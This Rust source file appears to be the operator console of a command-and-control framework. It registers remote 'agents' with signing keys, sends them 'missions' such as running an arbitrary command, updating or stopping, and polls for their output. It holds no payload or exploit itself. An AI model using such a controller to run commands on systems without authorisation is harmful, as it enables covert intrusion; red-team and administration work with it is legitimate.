use std::fs;

use base64::{prelude::BASE64_STANDARD, Engine as _};
use common::{crypto, model};
use error::ClientResult;
use selection::{Item, Selection};

mod client;
mod error;
mod selection;
mod utils;

const TASKS: &[Item<model::Task, fn() -> model::Task>] = &[
    Item::new("Execute", || {
        model::Task::Execute(utils::prompt("Command").unwrap())
    }),
    Item::new("Update", || model::Task::Update(vec![])),
    Item::new("Stop", || model::Task::Stop),
];

const PLATFORMS: &[Item<model::Platform, fn() -> model::Platform>] = &[
    Item::new("Unix", || model::Platform::Unix),
    Item::new("Windows", || model::Platform::Windows),
];

const MAIN_MENU_COMMANDS: &[Item<
    ClientResult<Option<Menu>>,
    fn() -> ClientResult<Option<Menu>>,
>] = &[
    Item::new("Select agent", || {
        Ok(Some(Menu::SelectAgent(client::list_agents()?)))
    }),
    Item::new("Create agent", || {
        let Some(platform) = Selection::from(PLATFORMS).select("Select platform")? else {
            println!("No platform selected");
            return Ok(None);
        };

        client::agents::create(
            utils::prompt("Agent name")?,
            crypto::VerifyingKey::from_bytes(
                fs::read(utils::prompt("Agent identity public key file path")?)?
                    .as_slice()
                    .try_into()
                    .unwrap(),
            )
            .unwrap(),
            platform,
        )?;
        Ok(None)
    }),
    Item::new("Update agent", || {
        let agents = client::list_agents()?;

        let Some(agent) = utils::select_agent(&agents)? else {
            println!("No agent selected");
            return Ok(None);
        };

        client::agents::update(&model::Agent {
            name: utils::prompt("New name")?,
            ..agent.clone()
        })?;
        Ok(None)
    }),
    Item::new("Generate identity key pair", || {
        let signing_key = crypto::get_signing_key();
        println!(
            "[+] Signing key: {:?}",
            BASE64_STANDARD.encode(signing_key.as_bytes())
        );
        println!(
            "[+] Verifying key: {:?}",
            BASE64_STANDARD.encode(signing_key.verifying_key().as_bytes())
        );
        Ok(None)
    }),
];

enum Menu {
    Main,
    SelectAgent(Vec<model::Agent>),
    Agent(model::Agent),
}

impl Menu {
    fn select(&self) -> Result<Option<ClientResult<Option<Menu>>>, dialoguer::Error> {
        match self {
            Menu::Main => Selection::from(MAIN_MENU_COMMANDS).select("Select a command"),
            Menu::SelectAgent(agents) => {
                let agents = agents
                    .clone()
                    .into_iter()
                    .map(|agent| (format!("{agent}"), agent))
                    .collect::<Vec<_>>();
                let select_agent_commands: Vec<Item<ClientResult<Option<Menu>>, _>> = agents
                    .iter()
                    .map(|(name, agent)| Item::new(name, || Ok(Some(Menu::Agent(agent.clone())))))
                    .collect();
                Selection::from(&select_agent_commands[..]).select("Select an agent")
            }
            Menu::Agent(agent) => {
                let agent_commands: &[Item<ClientResult<Option<Menu>>, _>] =
                    &[Item::new("Issue mission", || {
                        let Some(task) = Selection::from(TASKS).select("Select a task")? else {
                            println!("No task selected");
                            return Ok(None);
                        };

                        let mission = client::issue_mission(agent.id, task)?;
                        loop {
                            match client::get_mission_result(mission.id) {
                                Ok(Some(result)) => {
                                    println!("{result}");
                                    break Ok(None);
                                }
                                Err(e) => eprintln!("{e}"),
                                _ => {}
                            }
                            std::thread::sleep(std::time::Duration::from_secs(1));
                        }
                    })];
                Selection::from(agent_commands)
                    .select(&format!("[{}] Select a command", agent.name))
            }
        }
    }
}

fn main() -> ClientResult<()> {
    let mut menu_stack = vec![];
    menu_stack.push(Menu::Main);

    while let Some(menu) = menu_stack.last() {
        match menu.select()? {
            Some(result) => match result {
                Ok(Some(menu)) => menu_stack.push(menu),
                Ok(None) => continue,
                Err(e) => eprintln!("{e}"),
            },
            None => {
                menu_stack.pop();
            }
        }
    }
    println!("Bye! :)");
    Ok(())
}
